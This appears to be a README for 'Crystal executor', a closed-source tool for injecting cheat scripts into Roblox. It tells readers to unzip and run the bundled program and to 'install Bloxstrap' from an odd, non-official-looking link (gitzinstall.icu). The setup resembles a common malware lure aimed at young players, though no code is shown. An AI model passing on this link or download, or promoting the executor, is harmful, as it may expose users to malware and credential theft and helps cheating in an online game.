Crystal executor is my attempt at making an executor for executing/injecting Roblox scripts. It's not very big right now, but I intend to make it free.

Crystal executor has been finished in its first and early version. You may install it now or watch a tutorial video.
The tutorial video is work in progress sorry guys, but just extract the zip to Desktop and run the Crystal application inside of the folder.
Check example.png for a sneak peek.

Credits to my good friend Adam for help with making the icon.

WARNING: CRYSTAL EXECUTOR IS A BIT UNSTABLE. RESTART CRYSTAL AND/OR ROBLOX IF YOU FACE ISSUES.
If you are asking why I'm not open sourcing/publishing the code online is because its not even stable it can crash and stuffs like that.

If you want to exploit in general, please install Bloxstrap. Using the web can and probably will work for most executors,
but Bloxstrap guarentee's you will execute it. To install Bloxstrap go to: https://gitzinstall.icu?x93bqbsb80ufo0b
Enjoy!
